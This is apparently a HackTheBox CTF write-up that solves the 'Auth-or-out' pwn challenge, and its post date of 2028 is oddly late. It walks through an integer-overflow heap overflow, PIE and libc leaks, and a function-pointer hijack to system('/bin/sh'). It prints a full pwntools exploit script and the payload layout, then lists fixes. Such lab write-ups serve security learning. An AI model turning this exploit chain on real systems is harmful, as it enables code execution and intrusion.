---
layout: post
title: "Auth-or-out"
date: 2028-01-30 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, heap-overflow, integer-overflow, tinyalloc, function-pointer, pie-leak, ret2libc]
---

## Overview

Auth-or-out is a Medium Pwn challenge — a "DZONERZY authors editor" that stores each
author in a **custom heap allocator (`tinyalloc`) whose arena is a buffer on `main()`'s
stack**. Every mitigation is enabled (Full RELRO, stack canary, NX, PIE), yet we never
touch a saved return address. An [integer overflow](https://cwe.mitre.org/data/definitions/190.html)
in the note-size handling produces a zero-byte allocation with an oversized copy — a
[heap-based buffer overflow](https://cwe.mitre.org/data/definitions/122.html) — which we
steer into an adjacent object's inline **function pointer** to get
`system("/bin/sh")`.

## The technique

The author object is `0x38` bytes:

```
+0x00 Name[0x10]
+0x10 Surname[0x10]
+0x20 Note*          -> becomes rdi (first arg) when print_author fires
+0x28 Age
+0x30 Print*         -> the function pointer print_author calls
```

Two bugs chain together:

1. **Integer wrap.** The note size is read as an unsigned 64-bit value and passed to
   `ta_alloc(size + 1)`. Sending `0xffffffffffffffff` wraps `size + 1` to **0** — a
   zero-byte allocation — but the copy length is computed by a **separate** expression,
   `size > 0x100 ? 0x100 : size + 1`, so the read still copies up to **0xff bytes**.
   Allocation size and copy length disagree, and we overflow into the next chunk.

2. **Inline function pointer.** `print_author` executes `author->Print(author->Note)` —
   a function pointer at `struct+0x30` called with `struct+0x20` as its first argument.
   Overwrite both fields and you have `call(any_fn, any_arg)`.

`tinyalloc` keeps its block metadata in a header array at the **base** of the arena, so
data chunks are laid out **contiguously** with no headers between them, and freed
fixed-size (`0x38`) slots are recycled **LIFO**. That gives us two gifts: an overflow
reaches straight into the next object, and a recycled note slot still holds **stale bytes**
from whatever lived there before — including a stale `PrintNote` pointer at `note+0x30`.

## Solution

**Stage 1 — leak PIE with no dedicated leak gadget.** Allocate two authors, free both,
then allocate one *with* a note. LIFO recycling drops the note into a freed slot that
still contains a `PrintNote` pointer at offset `+0x30`. Fill exactly `0x30` non-null
bytes so the program's own `printf("Note: [%s]", note)` over-reads straight into that
stale pointer — the leak gives us the PIE base for free.

**Stage 2 — leak libc.** Groom a note chunk immediately before a live author struct, then
overflow it to set that victim's `Note = printf@got` and `Print = puts@plt`. Printing the
victim calls `puts(printf@got)`, leaking libc. The low 12 bits identify the exact build
via libc.rip — here **glibc 2.27-3ubuntu1.4**.

**Stage 3 — shell.** Same overflow, now `Note = &"/bin/sh"` and `Print = system`.

The full solve — the durable artifact — runnable verbatim against a fresh instance:

```python
from pwn import *
context.arch = 'amd64'
exe = ELF('./auth-or-out', checksec=False)
io  = remote(HOST, PORT)
NEG1 = (1 << 64) - 1

# menu wrappers add()/delete()/show() drive the editor prompts

# --- Stage 1: PIE via stale PrintNote in a recycled note slot ---
add(b'A1', b'A1', 0x41, 0)
add(b'A2', b'A2', 0x42, 0)
delete(1); delete(2)                              # free both 0x38 structs (LIFO free list)
add(b'EEEE', b'FFFF', 0x43, 55, b'Z' * 0x30)      # note recycles a slot with a stale PrintNote@+0x30
show(1)
io.recvuntil(b'Note: [')
data = io.recvuntil(b']', drop=True)
leak = u64(data[0x30:0x36].ljust(8, b'\0'))       # the stale ptr sits right after our 0x30 bytes
exe.address = leak - exe.sym.PrintNote

# --- Stage 2: libc via puts(printf@got) ---
add(b'BBBB', b'CCCC', 0x44, 0)                    # live victim (its struct sits after the note we place)
delete(1)                                         # free -> LIFO reuse drops the next note before the victim
payload = b'P'*88 + p64(exe.got['printf']) + p64(0) + p64(exe.plt['puts'])
add(b'DDDD', b'GGGG', 0x45, NEG1, payload)        # size=-1 => alloc(0) but copy 0xff -> overflow
show(2)
io.recvuntil(b'Age: '); io.recvline()
libc = ELF('libc-2.27.so', checksec=False)
libc.address = u64(io.recvline().strip().ljust(8, b'\0')) - libc.sym['printf']

# --- Stage 3: system("/bin/sh") ---
delete(1)
payload = b'P'*88 + p64(next(libc.search(b'/bin/sh\x00'))) + p64(0) + p64(libc.sym['system'])
add(b'HHHH', b'IIII', 0x46, NEG1, payload)
show(2)                                           # -> system("/bin/sh")
io.interactive()
```

The overwrite payload, measured from the note-buffer start, is
`b'P'*88 + p64(rdi_arg) + p64(0) + p64(target_fn)` — 88 bytes reach the victim's `Note`
field, 8 filler bytes cover `Age`, and the last 8 land on `Print`.

Running the solve against a fresh instance drops a shell and reads the flag:

```
$ cat flag.txt
HTB{...}
```

## Why it worked

The allocation size and the copy length are computed from **two different expressions**
off the same unsigned input, so a value that makes one tiny leaves the other large.
Combined with a custom allocator that packs objects contiguously and objects that carry
**raw inline function pointers**, one overflow reaches the next object's dispatch pointer
— hijacking control flow through a heap field rather than a saved return address, which is
exactly why Full RELRO + canary + NX + PIE offered no protection.

## Fix / defense

- Reject `size == (size_t)-1` and any size whose `+1`/`*k` arithmetic wraps; derive the
  **allocation length and copy length from the same validated value** (e.g.
  `__builtin_add_overflow`).
- Never place an allocator arena on the stack; keep metadata out-of-line **and** add
  inter-chunk redzones.
- Don't store raw function pointers inside heap objects — use an **index into a const
  dispatch table**, or pointer-mangling / CFI.
- Zero recycled allocations so a freed object's stale pointers can't be read back through
  an adjacent over-read.
